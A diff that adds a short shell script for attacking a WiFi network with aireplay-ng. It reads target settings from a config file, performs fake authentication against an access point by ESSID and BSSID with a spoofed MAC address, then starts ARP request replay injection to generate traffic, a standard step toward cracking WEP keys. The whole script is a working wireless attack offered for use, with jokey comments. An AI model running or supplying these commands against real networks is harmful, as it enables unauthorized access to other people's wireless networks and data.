@@ -1,0 +1,9 @@
+#!/bin/sh
+source ./config
+
+# fake authentication !
+aireplay-ng -1 0 -e $essid -a $bssid -h $mac wlan0
+
+# get your sassy self into ARP request replay mode.
+# (routers just *love* rebroadcasting ARP packet)
+aireplay-ng -3 -b $bssid -h $mac $interface
